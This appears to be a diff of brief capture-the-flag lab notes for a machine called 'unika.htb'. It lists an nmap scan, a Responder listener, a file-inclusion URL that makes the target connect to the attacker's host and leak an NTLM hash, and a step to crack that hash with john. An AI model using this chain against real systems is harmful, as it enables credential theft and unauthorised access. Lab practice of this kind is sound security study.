@@ -1,0 +1,13 @@
+# Task 2
+nmap -sV 10.129.112.181
+
+# Task 3
+echo "10.129.112.181 unika.htb" >> /etc/hosts
+
+# Task 7
+responder --help
+
+# Task 9
+sudo responder -I ALL -i 10.10.14.146
+Use http://unika.htb/index.php?page=//10.10.14.146/somefile with your ip
+Then use john to crack the hash
